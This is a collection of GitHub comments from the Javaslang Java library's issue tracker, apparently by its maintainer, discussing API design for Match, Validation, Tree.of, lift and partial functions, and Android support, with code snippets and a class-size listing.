ofEntries(java.util.Map.Entry<? extends K, ? extends V>... entries) {\npublic static <K, V> HashMap<K, V> ofEntries(Iterable<? extends java.util.Map.Entry<? extends K, ? extends V>> entries)\n. great :-)\n. Oh - haven't read correctly...\nLets remove the ofEntries(Iterable<Map.Entry>) and keep the names ofEntries instead of ofAll. This is what users will look for starting with Java 9.\n. Challenge accomplished :-) That was fast (as always).\n. This would be the solution:\njava\n@SuppressWarnings(\"varargs\")\n@SafeVarargs\nstatic <T> Tree<T> of(T... values) {\n    final List<T> list = List.of(values);\n    return list.isEmpty() ? empty() : of(list.head(), list.tail().map(Tree::of));\n}\nHowever, IntelliJ IDEA 15.0.1 does not compile calls like Tree.of(1, Tree.of(2), Tree.of(3)) now with the error message:\nCould not resolve method 'of(int, javaslang.collection.Tree.Node<java.lang.Integer>, javaslang.collection.Tree.Node<java.lang.Integer>)'\nBut jdk1.8.0_66 and Eclipse Neon M2 do compile it.\nI will defer this addition until 2.0.1 and hope that this issue will be fixed by IntelliJ. Maybe we should create an issue on the bug tracker...\n. Yes, I've seen it. It is ok - IntelliJ IDEA 15.0.2 has still compile errors. I will file close this issue and file a bug.\n. Issue: IDEA-150224\n. Wow, didn't know that.\nIt is more important to be sure to have all covered.\nLets\njava\nthrow new NoSuchElementException(ERR_NEXT_ON_EMPTY);\nwith\n``` java\nabstract class AbstractIterator implements Iterator {\nprotected static final String ERR_NEXT_ON_EMPTY = \"next() on empty iterator\";\n\n@Override\npublic String toString() {\n    return (isEmpty() ? \"\" : \"non-\") + \"empty iterator\";\n}\n\n}\n```\n. May I assign you to this task?\n. oookay - I will come back to that offer ;-)\n. thx!!\n. A contribution is greatly appreciated! There is already an issure: #803 \nI added it to the next minor release 2.0.1, targeted for Q1/2016. For the 2.0.0 we have closed shop now, so it would be best if you create a separate branch for that feature.\n. Please let's move the discussion to #803. I close this as duplicate.\n. better :)\n. yes!\n. Towards #484 \n. I originally wanted it for pattern matching\njava\nMatch.of(list)\n    .when(Cons(x, xs)).then(println(\"head: \" + x + \", tail: \" + xs))\n    .when(Nil).then(println(\"empty list\"));\nWhat other benefits could we have?\nAs long there is no decomposition in pattern matching I think we don't need them. Scala had them (for List only?).\n. Are there other types that have inner classes we don't want to expose?\n. I'm not sure if cyclops (@johnmcclean-aol) or derive4j (@jbgi) need access to Cons and Nil.\nDoes javaslang-jackson currently use them?\n. Basically we need the types for pattern matching, therefore they should stay with us.\n``` java\nSupplier s1 = Match.of(option)\n    .whenType(List.Cons.class).then(some -> ...)\n    .whenType(List.Nil.class).then(nil -> ...);\nSupplier s2 = Match.of(_try)\n    .whenType(Success.class).then(success -> ...)\n    .whenType(Failure.class).then(failure -> ...);\n```\nWe could make the constructors (package) private to make clear how to obtain classes. There have to be factory methods for the subtypes. I began already with that. Example:\n``` java\nstatic  Option of(T t);\nstatic  Option some(T t);\nstatic  Option none();\nstatic  Try of(CheckedSupplier<? extends T> supplier);\nstatic  Try success(T value);\nstatic  Try failure(Throwable exception);\n```\nThere is one thing to mention: List and Stream both have Cons, which was therefore moved into the classes List.Cons and Stream.Cons to avoid duplicate classes.\nNow that we will have the Validation monad in 2.0.1 there will be new Success and Failure classes in the javaslang.control package. This leads to the idea to also move these classes into Try.Success, Try.Failure and Validation.Success, Validation.Failure.\nTo be consistent, all other impl classes have to be moved into their interfaces. E.g. Option.Some, Option.None, Either.Left, Either.Right, etc.\n. - Move impl classes into their interfaces (static final)\n- Hide constructors of impl classes <-- this solves @romildo's question\n- Ensure that special factory methods for impl classes exist (but they return the interface)\n. Very nice addition :) Thx!\n. I would love to see this in a render library. I think it goes beyond functional extensions to Java and is worth to get a place of its own.\nA render library could also house other pretty-printing related utilities, image renderers (for trees) etc.\nIdeas for text renderers:\n- arbitrary strings could be aligned to a specific column length (also interesting for the Box model)\n- rendering of string templates, including aligning (I used s.th. similar as basis for Javaslang's Generator.scala)\n- ...\nIdeas for image renderers:\n- compute svg vector graphics\n- graph aligning algorithms\n- ...\nI could create a repository javaslang-render to include the Box model and Javaslang Tree renderer.\nWhat do you think?\n. Hi @romildo ,\nI have invited you to participate.\nOnce you joined I will give you write permissions to our new repository javaslang/javaslang-render.\nThe file structure has to be created accordingly to our other projects. Also I will enable travis-ci etc.\n. @romildo Thanks for joining! I created the repo and gave you write permissions.You find the initial Boxes impl there. You might change it as you want.\n. You're welcome. Short after Javaslang 2.0.0 is released we should also release a version of javaslang-render. But we take the time to get all right and in shape. No hurry.\nNote: The versioning will be semantic, namely javaslang-render and javaslang-jackson will have (almost) the same release-cycle as the core project javaslang because they depend on it.\n. Added with the project javaslang-render\n. Hi Norbert, your additions look great. Now let's remove the ambiguities.\nWe will take other method names. I.e. instead of 'then'  we have to choose a different name. Here are some candidates:\n- thenDo\n- thenRun\n- thenExec\n- thenPerform\n- thenConsume\nI would suggest to also rename then(Runnable) to underline that it performs a side-effect. Instead of\n- thenRun(Runnable)\n- thenConsume(Consumer)\nI would name both methods\n- thenRun(Runnable)\n- thenRun(Consumer)\n(same with otherwise: otherwiseRun)\nWhat do you think?\n. There is a big PR by @ruslansennov in the pipeline. I will pull it first. I think it is easier if you merge the changes.\n. Very nice, thx for your contribution!\n. Awesome. Looks like a huge amount of work!\nBig step towards 2.0.0\n\n. :+1: \n. Awesome, thx!\nI asked myself the question, too. get() is mandatory because MatchMonad extends Value. I think we don't need to add other terminal operations because Consumer and Runnable will only perform side-effects - nothing is returned. It is ok as it is!\n. Perfect.\n. Thank you, I will take a look this evening.\n. Hi Eric, thank you for the prototype and sorry for being so silent - I was very busy with Christmas orga and family activity the last days...\nYour solution looks well designed and simple. I like that. I see the scalaz-roots. My impression is that we can simplify the solution, because Java does not have higher-order kinds. Example: point aka pure constructs an instance - but we don't need that in Java. I also omitted it in Javaslang's Monad implementation.\nWhen I read the code I had some more ideas. I will comment the prototype accordingly and hope that I'm able to afford the time soon...\n. oh - you did close it? I wanted to spend time on it after vacation and release 2.0.0...\n. Ok :) Yes, please do a new PR.\n. Thx - you're right!!\n. Thx!\n. > Maybe Success should overwrite getOption and return Option.of(get()).\nThat would introduce inconsistencies because\ngetOption() == None <=> isEmpty() == true <=> get() throws NoSuchElementException\nWe would introduce magic special cases. Especially because Try is of type Value and we expect getOption(), isEmpty() and get() to work the same for every instance of Value.\n. Depends - it works correct in the way you defined it. We talk about partial functions. This would be correct in the sense you want it to behave:\njava\nFunction1<String, Option<String>> liftedMapGet = Function1.lift(key -> {\n    if (jdk8Map.containsKey(key)) {\n        return jdk8Map.get(key);\n    } else {\n        throw new NoSuchElementException(\"undefined at \" + key);\n    }\n});\nYou implicitly interpreted lift in a way it is not specified.\n. Please keep in mind that lift takes a partial function.\nLook at the docs of Scala's PartialFunction: http://www.scala-lang.org/api/current/index.html#scala.PartialFunction.\nHere are the relevant parts:\n\npartial function of type PartialFunction[A, B] is a unary function where the domain does not necessarily include all values of type A. The function isDefinedAt allows to test dynamically if a value is in the domain of the function.\n\nand\n\nIt is the responsibility of the caller to call isDefinedAt before calling apply, because if isDefinedAt is false, it is not guaranteed apply will throw an exception to indicate an error condition. If an exception is not thrown, evaluation may result in an arbitrary value.\n\nWe could add a method isDefined(T) to Function*.\n. And the javadoc of Javaslang's Function1 says:\njava\n/**\n * Lifts the given {@code partialFunction} into a total function that returns an {@code Option} result.\n *\n * @param partialFunction a function that is not defined for all values of the domain (e.g. by throwing)\n * @param <R> return type\n * @param <T1> 1st argument\n * @return a function that applies arguments to the given {@code partialFunction} and returns {@code Some(result)}\n *         if the function is defined for the given arguments, and {@code None} otherwise.\n */\nNothing said here about null - that's your interpretation.\n. \n. \n. Thx!\n. :)\n. Thx!\n. Hi, great to hear!\nThere are two flavors of match - the MatchMonad and the MatchFunction (see image below).\nImplementing equality for functions, especially for MatchFunction, is not possible (or practicable). A function f: X -> Y equals g: X -> Y if for all x in X either f(x) = g(x) or f(x) and g(x) are undefined.\nFor two MatchMonads m1 and m2 equality can be defined as:\nm1 equals m2 <=> (m1.isEmpty() && m2.isEmpty()) || Objects.equals(m1.get(), m2.get())\nCurrently I'm re-implementing parts of Match, I will implement the equals method for MatchMonad.\n\n. I think I'm tomorrow able to commit my Match changes...\n. Happy New Year! :fireworks: \n. Recognized a cast error. Already fixed it and will commit it soon.\n. I changed Monad.match() from\njava\nMatch.MatchMonad.Of<T> match();\nto\njava\nMatch.MatchMonad.Of<? extends Monad<T>> match();\nValue got:\njava\n// currently a default method but should be abstract\nMatch.MatchMonad.Of<? extends Value<T>> match();\nAll sub-interfaces and -classes need to override match() appropriately, e.g.\n``` java\ninterface Seq {\n    @Override\n    Match.MatchMonad.Of<? extends Seq> match();\n}\ninterface List {\n    // Same for Cons and Nil\n    @Override\n    default Match.MatchMonad.Of<? extends List> match() {\n        ...\n    }\n}\n```\n. @enelson great, it's yours! I haven't started to work on it.\nThe method declarations can be found in Monad.java (see Monad.Convertible), which is generated by Generator.scala.\nThe implementations reside in Value.java.\n. @enelson yes, right. You run it with Maven.\n- Command line (also IntelliJ IDEA):  mvn generate-sources, or better: mvn clean test\n- Eclipse: Right click project / Run as / Maven build... then specify goals generate-sources or clean test\n. Ah, great. Will have an eye on return types for other types...\n. Thanks, that helped :-))\n. thx!\n. Thx!\n. Great, and also thank you for adding the missing tests!\n. Thx!\n. The side-effecting-only parts of the Match DSL where separated from the parts that result in a value. This provides a clean API and helps the user not to mess up program logic.\n\n. When only side-effects are performed, we need not to throw a MatchError when no case matched.\nExample:\njava\n// nothing happens\nMatch.whenIs(1)\n     .thenRun(() -> System.out.println(\"matched!\"))\n     .accept(0);\n. Finished, tests will be added with #477 \n. Thank you!\nI'm able to write code again 'between the days'...\nMerry Christmas!\nDaniel\n. Thx :-))\n. many thx!\nshows again: untested code is broken code\n. Great, thx!\n. Hi Eric, great, thank you! I've already looked into it and will add some comments.\n. Awesome, I'm thankful for you help!\n. Great, thank you!\n. Great!\n. Yes, you are right!\n. Great thx!\n. Looks great, thx!\nNow that we have Iterator.fill and tabulate, Set and Map should be straight forward (similar to Stream.tabulate)\n. I think a static helper method in Collections fits better. Ruslan did s.th. similar in ValueModule.toTraversable: https://github.com/javaslang/javaslang/pull/988/files\nThis will reduce duplicate code.\nThe Iterator.tabulate method should be used only in the lazy case.\n. Yes, it is not lazy. If we create a helper method In the Collections class it would be better to use that, also for Maps and Sets. For SortedMap and SortedSet we need additional fill and tabulate methods having a Comparator argument, you will see it.\n. Mmhh, maybe we should wait for Jack & Jill supporting Java 8 on Android.\n. Yes. Maybe it is not a good idea.\nOutput of du -ah . | grep -v \"/$\" | sort -r in target/classes/javaslang:\n68K    ./collection/List.class\n 64K    ./collection/Stream.class\n 60K    ./collection/Vector.class\n 60K    ./collection/CharSeq.class\n 60K    ./collection/Array.class\n 60K    ./algebra\n 56K    ./concurrent\n 56K    ./collection/Queue.class\n 48K    ./collection/TreeMap.class\n 44K    ./collection/TreeSet.class\n 40K    ./collection/LinkedHashSet.class\n 40K    ./collection/LinkedHashMap.class\n 40K    ./collection/Iterator.class\n 40K    ./collection/HashSet.class\n 40K    ./collection/HashMap.class\n 32K    ./concurrent/Future.class\n 32K    ./collection/Tree.class\n 32K    ./collection/Stack.class\n 32K    ./algebra/Monad.class\n 24K    ./collection/Traversable.class\n 24K    ./collection/RedBlackTreeModule$Node.class\n 24K    ./collection/IndexedSeq.class\n 24K    ./Function8.class\n 24K    ./CheckedFunction8.class\n 20K    ./test/Gen.class\n 20K    ./control/Try.class\n 20K    ./control/Match$MatchMonad$When$Then.class\n 20K    ./collection/Seq.class\n 20K    ./collection/Map.class\n 20K    ./collection/LinearSeq.class\n 20K    ./Value.class\n 20K    ./Function7.class\n 20K    ./Function6.class\n 20K    ./CheckedFunction7.class\n 20K    ./CheckedFunction6.class\n 16K    ./test/Property$Property8.class\n 16K    ./test/Property$Property7.class\n 16K    ./test/Property$Property6.class\n 16K    ./test/Property$Property5.class\n 16K    ./test/Arbitrary.class\n 16K    ./collection/SortedSet.class\n 16K    ./collection/SortedMap.class\n 16K    ./Function5.class\n 16K    ./Function4.class\n 16K    ./CheckedFunction5.class\n 16K    ./CheckedFunction4.class\n 12K    ./test/Property.class\n 12K    ./test/Property$Property4.class\n 12K    ./test/Property$Property3.class\n 12K    ./test/Property$Property2.class\n 12K    ./test/Property$Property1.class\n 12K    ./control/Option.class\n 12K    ./control/Match$MatchMonad$Of.class\n 12K    ./control/Match$MatchFunction$When.class\n 12K    ./control/Match$MatchFunction$When$Then.class\n 12K    ./control/Either$RightProjection.class\n 12K    ./control/Either$LeftProjection.class\n 12K    ./concurrent/FutureImpl.class\n 12K    ./collection/Set.class\n 12K    ./collection/RedBlackTree.class\n 12K    ./Tuple8.class\n 12K    ./Tuple7.class\n 12K    ./Tuple6.class\n 12K    ./Tuple5.class\n 12K    ./Tuple4.class\n 12K    ./Lazy.class\n 12K    ./Function3.class\n 12K    ./Function2.class\n 12K    ./Function1.class\n 12K    ./CheckedFunction3.class\n 12K    ./CheckedFunction2.class\n 12K    ./CheckedFunction1.class\n8.0K    ./\u03bb$Type.class\n8.0K    ./test/Property$ForAll8.class\n8.0K    ./test/Property$ForAll7.class\n8.0K    ./test/Property$ForAll6.class\n8.0K    ./test/Property$ForAll5.class\n8.0K    ./test/Property$ForAll4.class\n8.0K    ./control/Match.class\n8.0K    ./control/Match$MatchMonad$WhenUntyped.class\n8.0K    ./control/Match$MatchMonad$When.class\n8.0K    ./control/Match$MatchMonad$Otherwise.class\n8.0K    ./control/Match$MatchFunction$WhenUntyped.class\n8.0K    ./control/Match$MatchFunction$WhenApplicable.class\n8.0K    ./concurrent/Promise.class\n8.0K    ./collection/TreeModule$Unzip.class\n8.0K    ./collection/Tree$Node.class\n8.0K    ./collection/Stream$Cons.class\n8.0K    ./collection/List$Cons.class\n8.0K    ./collection/HashArrayMappedTrieModule$LeafSingleton.class\n8.0K    ./collection/HashArrayMappedTrieModule$LeafList.class\n8.0K    ./collection/HashArrayMappedTrieModule$IndexedNode.class\n8.0K    ./collection/HashArrayMappedTrieModule$ArrayNode.class\n8.0K    ./collection/HashArrayMappedTrieModule$AbstractNode.class\n8.0K    ./collection/Collections.class\n8.0K    ./algebra/Foldable.class\n8.0K    ./ValueModule$Iterable.class\n8.0K    ./Tuple3.class\n8.0K    ./Tuple2.class\n8.0K    ./Tuple1.class\n8.0K    ./Tuple.class\n8.0K    ./Function0.class\n8.0K    ./CheckedFunction0.class\n4.0K    ./\u03bbModule.class\n4.0K    ./\u03bbModule$ReflectionUtil.class\n4.0K    ./\u03bb.class\n4.0K    ./test/Property$ForAll3.class\n4.0K    ./test/Property$ForAll2.class\n4.0K    ./test/Property$ForAll1.class\n4.0K    ./test/Property$Condition.class\n4.0K    ./test/Gen$1Frequency.class\n4.0K    ./test/Checkable.class\n4.0K    ./test/CheckResult.class\n4.0K    ./test/CheckResult$Satisfied.class\n4.0K    ./test/CheckResult$Falsified.class\n4.0K    ./test/CheckResult$Erroneous.class\n4.0K    ./test/Arbitrary$1.class\n4.0K    ./control/Try$Success.class\n4.0K    ./control/Try$NonFatalException.class\n4.0K    ./control/Try$FatalException.class\n4.0K    ./control/Try$Failure.class\n4.0K    ./control/Try$CheckedSupplier.class\n4.0K    ./control/Try$CheckedRunnable.class\n4.0K    ./control/Try$CheckedPredicate.class\n4.0K    ./control/Try$CheckedFunction.class\n4.0K    ./control/Try$CheckedConsumer.class\n4.0K    ./control/Try$1.class\n4.0K    ./control/Option$Some.class\n4.0K    ./control/Option$None.class\n4.0K    ./control/Option$1.class\n4.0K    ./control/MatchError.class\n4.0K    ./control/Match$MatchMonad.class\n4.0K    ./control/Match$MatchMonad$WhenApplicable.class\n4.0K    ./control/Match$MatchFunction.class\n4.0K    ./control/Match$MatchFunction$Otherwise.class\n4.0K    ./control/Match$MatchFunction$Case.class\n4.0K    ./control/Match$1.class\n4.0K    ./control/Either.class\n4.0K    ./control/Either$Right.class\n4.0K    ./control/Either$Left.class\n4.0K    ./control/Either$1.class\n4.0K    ./concurrent/PromiseImpl.class\n4.0K    ./collection/VectorModule.class\n4.0K    ./collection/VectorModule$Combinations.class\n4.0K    ./collection/Vector$1.class\n4.0K    ./collection/TreeModule.class\n4.0K    ./collection/TreeModule$ZipAll.class\n4.0K    ./collection/TreeModule$Zip.class\n4.0K    ./collection/TreeModule$Traversal.class\n4.0K    ./collection/TreeModule$Replace.class\n4.0K    ./collection/TreeModule$Map.class\n4.0K    ./collection/TreeModule$FlatMap.class\n4.0K    ./collection/TreeMap$EntryComparator.class\n4.0K    ./collection/Tree$Order.class\n4.0K    ./collection/Tree$Node$SerializationProxy.class\n4.0K    ./collection/Tree$Empty.class\n4.0K    ./collection/Tree$1.class\n4.0K    ./collection/Traversable$1.class\n4.0K    ./collection/StreamModule.class\n4.0K    ./collection/StreamModule$StreamIterator.class\n4.0K    ./collection/StreamModule$StreamFactory.class\n4.0K    ./collection/StreamModule$DropRight.class\n4.0K    ./collection/StreamModule$Combinations.class\n4.0K    ./collection/StreamModule$AppendSelf.class\n4.0K    ./collection/Stream$Empty.class\n4.0K    ./collection/Stream$Cons$SerializationProxy.class\n4.0K    ./collection/Stream$2.class\n4.0K    ./collection/Stream$1.class\n4.0K    ./collection/Seq$1Util.class\n4.0K    ./collection/RedBlackTreeModule.class\n4.0K    ./collection/RedBlackTreeModule$Empty.class\n4.0K    ./collection/RedBlackTree$Color.class\n4.0K    ./collection/RedBlackTree$1.class\n4.0K    ./collection/ListModule.class\n4.0K    ./collection/ListModule$SplitAt.class\n4.0K    ./collection/ListModule$Combinations.class\n4.0K    ./collection/List$Nil.class\n4.0K    ./collection/List$Cons$SerializationProxy.class\n4.0K    ./collection/List$1.class\n4.0K    ./collection/LinkedHashSet$SerializationProxy.class\n4.0K    ./collection/LinkedHashSet$1.class\n4.0K    ./collection/LinearSeqModule.class\n4.0K    ./collection/LinearSeqModule$LastIndexOfSlice.class\n4.0K    ./collection/IteratorModule.class\n4.0K    ./collection/IteratorModule$DistinctIterator.class\n4.0K    ./collection/IteratorModule$ConcatIterator.class\n4.0K    ./collection/Iterator$9.class\n4.0K    ./collection/Iterator$8.class\n4.0K    ./collection/Iterator$7.class\n4.0K    ./collection/Iterator$6.class\n4.0K    ./collection/Iterator$5.class\n4.0K    ./collection/Iterator$4.class\n4.0K    ./collection/Iterator$39.class\n4.0K    ./collection/Iterator$38.class\n4.0K    ./collection/Iterator$37.class\n4.0K    ./collection/Iterator$36.class\n4.0K    ./collection/Iterator$35.class\n4.0K    ./collection/Iterator$34.class\n4.0K    ./collection/Iterator$33.class\n4.0K    ./collection/Iterator$32.class\n4.0K    ./collection/Iterator$31.class\n4.0K    ./collection/Iterator$30.class\n4.0K    ./collection/Iterator$3.class\n4.0K    ./collection/Iterator$29.class\n4.0K    ./collection/Iterator$28.class\n4.0K    ./collection/Iterator$27.class\n4.0K    ./collection/Iterator$26.class\n4.0K    ./collection/Iterator$25.class\n4.0K    ./collection/Iterator$24.class\n4.0K    ./collection/Iterator$23.class\n4.0K    ./collection/Iterator$22.class\n4.0K    ./collection/Iterator$21.class\n4.0K    ./collection/Iterator$20.class\n4.0K    ./collection/Iterator$2.class\n4.0K    ./collection/Iterator$19.class\n4.0K    ./collection/Iterator$18.class\n4.0K    ./collection/Iterator$17.class\n4.0K    ./collection/Iterator$16.class\n4.0K    ./collection/Iterator$15.class\n4.0K    ./collection/Iterator$14.class\n4.0K    ./collection/Iterator$13.class\n4.0K    ./collection/Iterator$12.class\n4.0K    ./collection/Iterator$11.class\n4.0K    ./collection/Iterator$10.class\n4.0K    ./collection/Iterator$1.class\n4.0K    ./collection/IndexedSeqModule.class\n4.0K    ./collection/IndexedSeqModule$LastIndexOfSlice.class\n4.0K    ./collection/IndexedSeq$1.class\n4.0K    ./collection/HashSet$SerializationProxy.class\n4.0K    ./collection/HashSet$1.class\n4.0K    ./collection/HashArrayMappedTrieModule.class\n4.0K    ./collection/HashArrayMappedTrieModule$LeafNode.class\n4.0K    ./collection/HashArrayMappedTrieModule$LeafList$1.class\n4.0K    ./collection/HashArrayMappedTrieModule$EmptyNode.class\n4.0K    ./collection/HashArrayMappedTrieModule$Action.class\n4.0K    ./collection/HashArrayMappedTrie.class\n4.0K    ./collection/Comparators.class\n4.0K    ./collection/Comparators$SerializableComparator.class\n4.0K    ./collection/CharSeqModule.class\n4.0K    ./collection/CharSeqModule$Combinations.class\n4.0K    ./collection/CharSeq$CharUnaryOperator.class\n4.0K    ./collection/CharSeq$CharFunction.class\n4.0K    ./collection/CharSeq$1.class\n4.0K    ./collection/ArrayModule.class\n4.0K    ./collection/ArrayModule$Combinations.class\n4.0K    ./collection/Array$1.class\n4.0K    ./collection/AbstractIterator.class\n4.0K    ./algebra/Semigroup.class\n4.0K    ./algebra/Monoid.class\n4.0K    ./algebra/Monoid$1.class\n4.0K    ./algebra/Functor.class\n4.0K    ./algebra/Convertible.class\n4.0K    ./ValueModule.class\n4.0K    ./ValueModule$Printable.class\n4.0K    ./Tuple0.class\n4.0K    ./Lazy$Undefined.class\n4.0K    ./Lazy$Defined.class\n4.0K    ./Lazy$1.class\n4.0K    ./Function8Module.class\n4.0K    ./Function8Module$Memoized.class\n4.0K    ./Function8$Type.class\n4.0K    ./Function8$1.class\n4.0K    ./Function7Module.class\n4.0K    ./Function7Module$Memoized.class\n4.0K    ./Function7$Type.class\n4.0K    ./Function7$1.class\n4.0K    ./Function6Module.class\n4.0K    ./Function6Module$Memoized.class\n4.0K    ./Function6$Type.class\n4.0K    ./Function6$1.class\n4.0K    ./Function5Module.class\n4.0K    ./Function5Module$Memoized.class\n4.0K    ./Function5$Type.class\n4.0K    ./Function5$1.class\n4.0K    ./Function4Module.class\n4.0K    ./Function4Module$Memoized.class\n4.0K    ./Function4$Type.class\n4.0K    ./Function4$1.class\n4.0K    ./Function3Module.class\n4.0K    ./Function3Module$Memoized.class\n4.0K    ./Function3$Type.class\n4.0K    ./Function3$1.class\n4.0K    ./Function2Module.class\n4.0K    ./Function2Module$Memoized.class\n4.0K    ./Function2$Type.class\n4.0K    ./Function2$1.class\n4.0K    ./Function1Module.class\n4.0K    ./Function1Module$Memoized.class\n4.0K    ./Function1$Type.class\n4.0K    ./Function1$1.class\n4.0K    ./Function0Module.class\n4.0K    ./Function0Module$Memoized.class\n4.0K    ./Function0$Type.class\n4.0K    ./Function0$1.class\n4.0K    ./CheckedFunction8Module.class\n4.0K    ./CheckedFunction8Module$Memoized.class\n4.0K    ./CheckedFunction8$Type.class\n4.0K    ./CheckedFunction8$1.class\n4.0K    ./CheckedFunction7Module.class\n4.0K    ./CheckedFunction7Module$Memoized.class\n4.0K    ./CheckedFunction7$Type.class\n4.0K    ./CheckedFunction7$1.class\n4.0K    ./CheckedFunction6Module.class\n4.0K    ./CheckedFunction6Module$Memoized.class\n4.0K    ./CheckedFunction6$Type.class\n4.0K    ./CheckedFunction6$1.class\n4.0K    ./CheckedFunction5Module.class\n4.0K    ./CheckedFunction5Module$Memoized.class\n4.0K    ./CheckedFunction5$Type.class\n4.0K    ./CheckedFunction5$1.class\n4.0K    ./CheckedFunction4Module.class\n4.0K    ./CheckedFunction4Module$Memoized.class\n4.0K    ./CheckedFunction4$Type.class\n4.0K    ./CheckedFunction4$1.class\n4.0K    ./CheckedFunction3Module.class\n4.0K    ./CheckedFunction3Module$Memoized.class\n4.0K    ./CheckedFunction3$Type.class\n4.0K    ./CheckedFunction3$1.class\n4.0K    ./CheckedFunction2Module.class\n4.0K    ./CheckedFunction2Module$Memoized.class\n4.0K    ./CheckedFunction2$Type.class\n4.0K    ./CheckedFunction2$1.class\n4.0K    ./CheckedFunction1Module.class\n4.0K    ./CheckedFunction1Module$Memoized.class\n4.0K    ./CheckedFunction1$Type.class\n4.0K    ./CheckedFunction1$1.class\n4.0K    ./CheckedFunction0Module.class\n4.0K    ./CheckedFunction0Module$Memoized.class\n4.0K    ./CheckedFunction0$Type.class\n4.0K    ./CheckedFunction0$1.class\n. Ah, ok.\nThis reminds me of good old Google Web Toolkit programming. A subset of Java was supported on the client-side. Simple things were simple, complex things were ... possible.\nI think then there is no simple way to support the Android platform. Seems like the Android platform has to be changed then :-) And I'm pretty sure that it will be changed when more and more Java libraries will move to Java 8 over time.\n@bruce264 I think there's not much we can do at the moment. Too many hurdles...\n. Sounds like highway to hell. I will rename Javaslang to 'functional backend library for Java 8+' ;-)\n. I will close this for now as not accomplishable in mid-term.\n. First step in that direction by Google?\nAndroid N and beyond to ditch Oracle\u2019s Java for open source version\n. @mhdtouban Someone needs to try to use the existing Javaslang version with the new Android version. If there are any issues please report them. We will see if it is possible to solve them. Maybe we are able to reduce the method count in the next major version.. @tmtron thanks for the great overview! I will take the 'Annotation Processors' hints into account!\nMaybe the modularization of the upcoming Vavr 1.0.0 will help.\nWe can't change features because of Android because 'form follows function', i.e. we provide the functionality and frameworks may or may not adapt it.. Thanks! I have some initial thoughts on it - comments come in a minute\n. @enelson Thank you! This looks great.\nRegarding the List/Semigroup I think we should not try to get the same generics and method signatures in Javaslang as in Scalaz.\nI would keep it as simple as possible. The only purpose of Validation is to accumulate errors. Otherwise we could just flatMap a Try. IMO the order of error occurrence is important. That means we need at least a Seq. If we want to give the user a hint of the performance characteristics of the result we could choose LinearSeq or IndexedSeq. Because the number of subsequent validations is currently bounded (I think) to the number of tuples we have, I would use a LinearSeq. I don't expect millions of errors for one validation, therefore linear time complexity for access is ok. In practice the errors are Iterated. Personally I prefer List over LinearSeq. That's what it is. It does not need to be generic.\nTry has two methods to access the results: get() and failed(). We need something similar for Validation. get() will throw NoSuchElementException in the case of Invalid. We need to rename the factory methods success(T) to valid(T) and failure(E) to invalid(E). Also we need isValid() and isInvalid() instead of isSuccess() and isFailure() to be consistent. Try has failed() to access the Throwable of a Failure. Resp. we should have a method invalid() or errors(). I would prefer invalid because it is more general. We don't know the use case, especially we don't know if the invalid case describes errors.\nThis leads to:\n``` java\ninterface Validation {\nstatic <E, T> Validation<E, T> valid(T t) { ... }\n\nstatic <E, T> Validation<E, T> invalid(E... es) { ... }\n\nboolean isValid();\n\nboolean isInvalid();\n\nT get();\n\n// I hope this does not collide with the static factory method invalid(E...)\nList<E> invalid();\n\n}\n```\nThe List does not need to be part of the Validation type signature because it is fixed. We just need to know the component type E.\nWhat do you think. Does this sound reasonable? Or is there a use case where it makes sense to be more generic?\n. Yes, it is fun for me, too. Your suggestions are thoughtful.\nI'm fine naming it error().You're right, when a validation fails it is an error.\nAnd you're also right - we need validation.swap().swap() to be the identity, namely validation. That's the only constraint. If we achieve this by moving the relevant parts to the Builder, it is the right choice.\nIt is good to have you on board :)\n. Awesome!!\nWe will include it in 2.0.0. I plan a new release candidate soon, 2.0.0-RC3. I need some slight modifications in order to pull it. Please see my comments.\n. I'm really looking forward to that pull!\n. Decide yourself if method params are renamed. They do not need to necessarily. It isn't consistent done in Javaslang.\n. With flattening I meant:\njava\ninterface Valitation {\n   final class ValidationBuilder {\n   }\n   final class ValidationBuilder3 {\n   }\n   final class ValidationBuilder4 {\n   }\n   ...\n}\ninstead of\njava\ninterface Valitation {\n   final class ValidationBuilder {\n       final class ValidationBuilder3 {\n           final class ValidationBuilder4 {\n               ...\n           }\n       }\n   }\n}\nI think we then also can simplify the names:\njava\ninterface Valitation {\n   final class Builder {\n   }\n   final class Builder3 {\n   }\n   final class Builder4 {\n   }\n   ...\n}\n. Looks pretty polished already! I added two comments (accidentally to the commit on your branch I think)\n. @enelson Thank you for this huge effort! There is nothing to say other than I really enjoyed working on this with you and that I'm super-happy to press the Merge button in a second :-)\nI will integrate the monadic stuff into Validation, I've been working on this the last days...\n. Thank you! I will have a look the next days what can be done in order to get 2.0.0 right.\n. @enelson I confused Monad with Value... next, Validation needs to implement Value. It would be great if you could do that. It will be right-biased, like Either, e.g.\njava\ninterface Validation<E, T> extends Value<T> { ... }\n. Oh - and just saw that we wanted to rename the static map2, ..., map8 methods all to just combine to be consistent with the non-static validation.combine(Validation) which returns a Builder. Could you do that, please?\n. Thx!\n. Thx!\n. Great! Good to see melting down partial and missed lines. Thx!\n. Nice, thanks Matteo!\n. Fixes #976 \n. yep\n. thx!\n. Great!\n. :+1: :+1: :+1: \n. We don't need stats for now.\n. On the other hand we want to map or flatMap the overall result. I think the current solution is better - never mind.\n. \n. Thx!\n. (pressed the wrong button on my smartphone)\n. Hi Simone! Well done. Please find my comments above.\nMany thanks for all your effort!\n. Great, thx!\n. Thx!\n. Just saw your fix. It's right, we saw race-conditions. Future behaves right. The onComplete actions are executed on separate threads of the underlying ExecutorService. Thx!\n. @ruslansennov can be closed now, right?\n. All ok - just wanted to get sure. I'm preparing RC3...\n. That condition was a race ;)\n. Towards #976 \n. Thank you :)\n. Thank you Eric!\n. Haven't slept well today, I have a cold and coughed all the night. But it is getting better :)\n. The BiFunctor.bimap function with argument\njava\nFunction<? super Tuple2<? super T1, ? super T2>, ? extends Tuple2<? extends U1, ? extends U2>>\nmade problems. Without loosing anything we can simplify it to\njava\nFunction<Tuple2<T1, T2>, Tuple2<U1, U2>>\nTested with IntelliJ IDEA:\n``` java\ninterface Test {\n<U1, U2> HashMap<U1, U2> bimap(Function<Tuple2<T1, T2>, Tuple2<U1, U2>> f);\n\nstatic <T1, T2> Test<T1, T2> create() {\n    return null;\n}\n\nstatic void test() {\n\n    Test<Integer, Iterator<String>> test = create();\n\n    // ok\n    Map<Number, Seq<CharSequence>> r1 = test.bimap(entry -> Tuple.of(entry._1, List.ofAll(entry._2)));\n\n    // ok\n    HashMap<Integer, List<String>> r2 = test.bimap(entry -> Tuple.of(entry._1, List.ofAll(entry._2)));\n}\n\n}\n```\nI will scan the other method signatures of Javaslang if we can simplify anything.\n. I question the support of a BiMonad type. 